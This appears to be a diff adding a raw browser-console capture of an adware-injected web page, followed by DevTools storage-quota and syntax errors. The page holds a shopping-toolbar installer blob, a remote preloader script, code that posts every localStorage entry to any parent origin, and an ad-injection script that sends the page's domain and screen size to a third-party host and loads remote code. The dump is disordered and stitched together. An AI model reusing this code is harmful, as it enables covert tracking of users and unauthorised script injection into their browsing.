@@ -1,0 +1,81 @@
+-Sources:
+-http://cds.v3x3b3b5.hwcdn.net/dc/510180/c5/4.html:
+-Evaluate in console:
+<!DOCTYPE html><html><head><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTQ3OTA5ODc2OTgiLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1NDc3NzYxODYyOCIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1NDc4OTI3NDM0OSIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTQ3OTEwNTE5NDMiLCJwcmVwb3BfdGltZXIiOiIxNDU0NzY1MDU4MDIxfHx8MTQ1NDg1MTQ1ODAyMiIsInByZXBvcF9pbmRleCI6IjB8fHwxNDU0ODUxNDU4MDI4IiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2IiwiVkJBVEVTX0luc3RhbGxlZCI6InRydWV8fHw4NjQxNDUwNTQ1NTcxNzE5In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script><script>// life start
+if(!localStorage.getItem('am__start'))
+	localStorage.setItem('am__start',~~((new Date()).getTime()/1000));
+
+// daily clear
+if((!localStorage.getItem('am_nextclear'))||(1*localStorage.getItem('am_nextclear')<(new Date()).getTime())){
+	for(var i=localStorage.length-1;i>=0;i--){
+		var k=localStorage.key(i);
+		if(k.indexOf('am__')!==0&&k.indexOf('am_')===0)
+			localStorage.removeItem(k);//remove all non _ items
+	}
+	// calculate time for next clear
+	var next=new Date();
+	next.setHours(4);
+	next.setMinutes(0);
+	localStorage.setItem('am_nextclear',next.getTime()+(24*60*60*1000));
+	localStorage.setItem('am_start',~~((new Date()).getTime()/1000));
+}
+
+//populate our data
+data={};
+for(var i=localStorage.length-1;i>=0;i--){
+	var k=localStorage.key(i);
+	if(k.indexOf('am_')===0)
+		data[k.replace(/^am_/,'')]=localStorage.getItem(k);
+	else
+		localStorage.removeItem(k)//make sure localStorage will not get full
+}
+
+// get hostname for postMessage protocol
+function getHostname(url){
+	return url.toString().replace(/^[^\/]*[\/][\/]/,'').replace(/^([^\/?#]*).*$/,"$1");
+}
+
+var src; // allowed domains for postMessage protocol
+var p=location.href.toString().replace(/^[\?#]/,'&'); // query parameters (location.search)
+if(/&src=/.test(p))
+	src=getHostname(p.split(/&src=/)[1].replace(/&.*$/,''));// when src param is set, update the allowed hostname accordingly
+ 
+////////////////////////
+////// Verticals ///////
+////////////////////////
+// // verticals_data_json
+
+// send the local data to original window
+// note that src must start with 'http://' otherwise nothing works. unless it is just '*'
+//
+window.parent.postMessage('Es2al='+JSON.stringify(data),'*');//src?'http://'+src:'*'
+
+// support set_data using postMessage protocol listener
+var listener=function(e){
+	if(getHostname(e.origin)!==src||e.data.indexOf('am_')!==0||e.data.indexOf(':')<1) // ignore messages that are not ours (strangely we do receive those)
+		return;
+	var ar=e.data.split(':'); // parse the key:value
+	if(ar[1]==='')
+		localStorage.removeItem(ar[0]);// value of empty string means remove this item
+	else
+		localStorage.setItem(ar[0],ar[1]);
+};
+if(window.addEventListener){
+	addEventListener("message",listener,false);
+}else{
+	attachEvent("onmessage",listener);
+}
+</script></head><body><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnxxV5EkWt2EGsZlGV9a77eFWdPI7ysibB%2bDJlt53JllK2fE%2bk21YWEqcFEWxiFmYMdtpHZ2TXdKvbm%2b%2fiPBjH69VITNjWUjkfTQLMxFjNP6yJ1oM43eyUGPh4pwYlPSPUYOYIHQ7qb%2baAFVWH9wE8Qz7s2S2fyDj29EJd0pJfXp2txqzHB9%2fehIBH7g%2bRWT4ktsGLNDCDPoFwAgipCcYHUu5ZvwF1Bv4pK%2fM5OtRMRzslzoMYCTmwgjKlD2vPR%2fEFTLqdet9YNf4LIdO2n%2bbMGTwQCsxpRdWOfft0vZ2OVBUVtZSvzpWfbN%2bNwKe9ZLtDQCzNKXC6f%2f8x%2fuDB1b79C5Aa63NLbelqZ4qrRaVOFR%2bD7Fuc8t6PBnUFddf6QnOPYkpECMyLQHAJpGTmaGyY1V2QMVgrLNl1mKNv6bCR9XNBdgw4FtvLi%2bk%2bMDggnYGTI9fPuOFpwm4piueGJsaulQYVzNIA3VSXK6u81KGfXbdXDCUYPc58ioSES2W3TFTcqC9Rha5IkfagbT6Xfam1YwEIOm%2bQWTIJmzQ8Sx1XYlKB1WG9ffdvhm4UCb6neiHgUQIjdJKNytk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
+Error saving setting with name: consoleHistory, value length: 5879024. Error: Failed to set the 'consoleHistory' property on 'Storage': Setting the value of 'consoleHistory' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4079
+Setting: 'savedURLs', size: 3268
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+Uncaught SyntaxError: Unexpected token <(…)
